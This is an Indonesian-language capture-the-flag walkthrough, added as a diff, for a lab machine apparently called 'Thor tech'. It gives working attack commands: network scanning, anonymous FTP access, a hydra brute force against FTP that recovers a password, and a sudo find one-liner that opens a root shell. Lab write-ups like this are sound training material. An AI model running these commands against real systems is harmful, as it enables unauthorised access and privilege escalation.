@@ -1,0 +1,29 @@
+Walkthrough Thor tech
+
+1. Cek ip dengan menggunakan command netdisover:
+'netdiscover -i ens33 -r 192.168.0.0/24'
+dan didapatkan ipnya adalah : '192.168.0.82'
+
+2. setelah itu kita cek port yang terbuka dengan menggunakan nmap :
+'nmap -A 192.168.0.82'
+dan port yang terbuka 21,22,80
+
+3. karena port ftp terbuka saya pun cek ftp nya menggunakan command lftp :
+'lftp -u anonymous, 192.168.0.82'
+dan ternyata bisa login.
+
+4. setelah itu saya cek file yang ada dan terdapat tulisan
+'Dear pwnlab,                           
+
+My name is jake. Your password is very weak and easily crackable, I think change your password.'
+Menurut saya disini pwnlab memiliki password yang mudah di bruteforce jadi saya menggunakan hydra
+'hydra -l pwnlab -P /opt/wordlist/rockyou.txt 192.168.0.82 ftp'
+
+5. dan didapatkan passwordnya yaitu babygirl1. dan saya coba ssh pakai user dan password tersebut ternyata berhasil. dan saya pun mendapat flag user.txt
+
+6. setelah dapat flag user. tugas selanjutnya adalah mendapat flag root jadi saya coba sudo -l dan kita bisa memakai comman find dengan sudo saya pun mencari di https://gtfobins.github.io/ 
+
+7. dan dengan menggunakan command berikut kita bisa mendapat shell root:
+'sudo find . -exec /bin/sh \; -quit'
+
+8. dan mendapat flag root.txt
